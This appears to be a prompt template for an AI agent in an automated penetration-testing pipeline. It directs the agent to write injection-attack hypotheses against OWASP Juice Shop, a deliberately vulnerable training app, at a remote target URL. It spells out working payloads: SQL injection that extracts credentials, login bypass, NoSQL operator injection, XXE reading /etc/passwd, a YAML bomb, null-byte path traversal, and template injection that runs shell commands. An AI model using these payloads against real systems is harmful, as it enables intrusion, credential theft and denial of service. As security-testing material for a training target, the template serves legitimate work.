# Phase 1a — Injection Analysis

CRITICAL: The target is a REMOTE server at {{TARGET_URL}}.
Do NOT assume localhost. Do NOT use 127.0.0.1.
Use the provided {{TARGET_URL}} for ALL requests.

## Objective

Analyse the reconnaissance data and known vulnerabilities to produce **injection attack hypotheses** targeting the OWASP Juice Shop at {{TARGET_URL}}. Focus exclusively on **SQL injection, NoSQL injection, and command injection** vectors.

Each hypothesis must be specific, actionable, and grounded in evidence from the recon phase. Do NOT guess — cite specific endpoints, parameters, and evidence.

## Input Data

### Recon Report

{{RECON_DATA}}

### Known Vulnerabilities

{{KNOWN_VULNS}}

## Analysis Instructions

1. **Review all endpoints** from the recon report and identify those that accept user-controlled input which could reach a database query or OS command.
2. **Cross-reference sinks with source code evidence** — the recon report's Identified Sinks section now includes source file and line number. For each sink:
   - Verify the input flow: which `req.query` / `req.body` / `req.params` field enters the sink?
   - Is there any sanitization between the entry point and the sink?
   - What is the exact SQL query shape (for crafting precise payloads)?
3. **Cross-reference with known CVEs** — if a CVE describes SQL injection in a specific Juice Shop component/version, create a targeted hypothesis for it.
4. **Prioritise by exploitability:**
   - Endpoints with direct string concatenation into SQL (highest priority — source code confirmed)
   - Endpoints using ORM methods that may have raw query fallbacks (source code shows `raw: true`)
   - Endpoints with indirect injection vectors (e.g., JSON body fields parsed into queries)
4. **Consider Juice Shop specifics:**
   - Sequelize ORM with known raw query patterns
   - SQLite backend (adjust payloads for SQLite syntax)
   - The search endpoint (`/rest/products/search?q=`) is a classic injection target
   - Login endpoint may be vulnerable to authentication bypass via SQL injection

## CRITICAL: Source-Code-Derived Query Shapes

Use the EXACT query shapes from the recon report's sinks section to craft precise payloads. The two most important queries are:

### Search endpoint (routes/search.ts)
```sql
SELECT * FROM Products WHERE ((name LIKE '%<CRITERIA>%' OR description LIKE '%<CRITERIA>%') AND deletedAt IS NULL) ORDER BY name
```
- Your input replaces `<CRITERIA>` and is placed between `'%` and `%'`
- To break out: close the `%'` first, then the double-parentheses `))`
- The Products table has **9 columns**: id, name, description, price, deluxePrice, image, createdAt, updatedAt, deletedAt
- UNION payloads MUST have exactly 9 columns to match

### Login endpoint (routes/login.ts)
```sql
SELECT * FROM Users WHERE email = '<EMAIL>' AND password = '<HASHED_PASSWORD>' AND deletedAt IS NULL
```
- Email is injected directly (no hashing applied)
- Password is hashed BEFORE concatenation, so inject ONLY via the email field
- To bypass auth: close the `'` after email, then comment out the rest with `--`

## MANDATORY Hypotheses

Your output MUST include hypotheses for ALL of the following (at minimum):

### SQL Injection (Search + Login)
1. Boolean-based SQL injection on `/rest/products/search?q=` using `')) OR 1=1--`
2. UNION-based SQL injection on `/rest/products/search?q=` for schema extraction (9 columns)
3. UNION-based SQL injection on `/rest/products/search?q=` for user credential extraction
4. Authentication bypass on `/rest/user/login` via email field injection
5. Christmas Special SQLi — `')) UNION SELECT ... WHERE deletedAt IS NOT NULL--` to find hidden/deleted products on search endpoint
6. User Credentials extraction — UNION query extracting `id,email,password,role` from `Users` table

### NoSQL Injection
7. NoSQL operator injection on `PATCH /rest/products/reviews` using `{"id":{"$ne":-1}}` to modify all reviews
8. NoSQL query injection on login endpoint — `{"email":{"$gt":""},"password":{"$gt":""}}` (if MongoDB layer exists)

### XXE (XML External Entity)
9. XXE file disclosure via XML upload to `POST /file-upload` with `<!ENTITY xxe SYSTEM "file:///etc/passwd">`
10. XXE via B2B orders endpoint `POST /b2b/v2/orders` with malicious XML payload

### YAML Injection
11. YAML injection/bomb via YAML file upload to `POST /file-upload` — a YAML bomb (`&a [*a,*a,...]`) that causes DoS via exponential expansion

### Path Traversal & Null Bytes
12. Path traversal on `GET /ftp/:file` using `../` sequences to access files outside the ftp directory
13. Poison Null Byte — `%00` in file paths on `/ftp/` to bypass extension filters (e.g., `package.json.bak%2500.md`)

### Server-Side Template Injection (SSTI)
14. SSTI on `POST /b2b/v2/orders` via Pug/Jade template injection in the `orderLinesData` field — e.g., `#{7*7}` or `#{global.process.mainModule.require('child_process').execSync('id')}`

## Hypothesis Format

For EACH hypothesis, use this EXACT format:

```markdown
### Hypothesis N
**Endpoint:** <METHOD> <full URL path>
**Parameter:** <parameter name>
**Injection Type:** <boolean / UNION / auth bypass / blind / error-based / NoSQL / XXE / YAML / path-traversal / null-byte / SSTI>
**Payload:** <specific injection payload — must account for the exact query shape>
**URL-Encoded Payload:** <the payload with special chars URL-encoded for direct use in curl>
**Expected Result:** <what a successful injection would produce — be specific about response differences>
**Evidence from recon:** <reference to specific endpoint/sink from recon_report.md, including source file and line>
**Query Shape:** <the exact SQL query from source code where this payload will be injected>
```

## Required Output

Produce a markdown document with the heading `## Hypotheses` followed by at least 3 numbered hypotheses. Example structure:

```markdown
## Hypotheses

### Hypothesis 1
**Endpoint:** GET /rest/products/search?q=
**Parameter:** q
**Payload:** ' OR 1=1--
**Expected Result:** Returns all products instead of filtered subset (expect 30+ items vs 0)
**Evidence from recon:** Identified as SQL injection sink in recon_report — parameter concatenated into Sequelize raw query

### Hypothesis 2
**Endpoint:** POST /rest/user/login
**Parameter:** email (JSON body)
**Payload:** ' OR 1=1--
**Expected Result:** Authentication bypass — returns valid JWT without correct credentials
**Evidence from recon:** Login endpoint identified; Sequelize raw query pattern for auth

### Hypothesis 3
...
```

## Payload Guidelines for Juice Shop (SQLite + Sequelize)

- Use SQLite-compatible syntax: `'`, `--`, `/**/`, `UNION SELECT`
- **Search endpoint payloads** (must close `%'` and `))` before injecting):
  - Boolean: `qwert')) OR 1=1--` (NOT `' OR 1=1--` — that fails because it doesn't close the parentheses)
  - UNION schema: `qwert')) UNION SELECT sql,name,'3','4','5','6','7','8','9' FROM sqlite_master WHERE type='table'--`
  - UNION users: `qwert')) UNION SELECT id,email,password,role,'5','6','7','8','9' FROM Users--`
  - Christmas Special: `qwert')) UNION SELECT id,name,description,price,'5','6','7','8','9' FROM Products WHERE deletedAt IS NOT NULL--`
- **Login endpoint payloads** (inject via email field only):
  - Auth bypass: `' OR 1=1--` in the email field, any password
  - Targeted admin bypass: `admin@juice-sh.op'--` in the email field
- For JSON body injection (login): `{"email": "' OR 1=1--", "password": "x"}`
- For NoSQL-style: try `{"email": {"$gt": ""}, "password": {"$gt": ""}}` (if MongoDB layer exists)

### NoSQL Injection Payloads
- `PATCH /rest/products/reviews` with body: `{"id":{"$ne":-1},"message":"hacked"}`
- Operators to try: `$ne`, `$gt`, `$regex`, `$where`

### XXE Payloads
- Upload XML to `/file-upload` or `/b2b/v2/orders`:
  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
  <stockCheck><productId>&xxe;</productId></stockCheck>
  ```
- For B2B orders: POST XML with `Content-Type: application/xml`

### YAML Injection Payloads
- Upload a `.yml` file to `/file-upload` containing a YAML bomb:
  ```yaml
  a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
  b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
  c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
  ```

### Path Traversal / Null Byte Payloads
- `GET /ftp/eastere.gg%2500.md` — null byte (`%2500` = URL-encoded `%00`) bypasses extension filter
- `GET /ftp/package.json.bak%2500.md` — access backup files via null byte bypass
- `GET /ftp/../../etc/passwd` — direct path traversal attempt
- `GET /ftp/coupons_2013.md.bak%2500.md` — access coupon backup files

### SSTI Payloads (Pug/Jade on B2B endpoint)
- `POST /b2b/v2/orders` with `orderLinesData` containing: `#{7*7}` (expect `49` in response)
- Escalation: `#{global.process.mainModule.require('child_process').execSync('id').toString()}`

Save the output as `hypotheses_injection.md` using the `save_deliverable` tool.
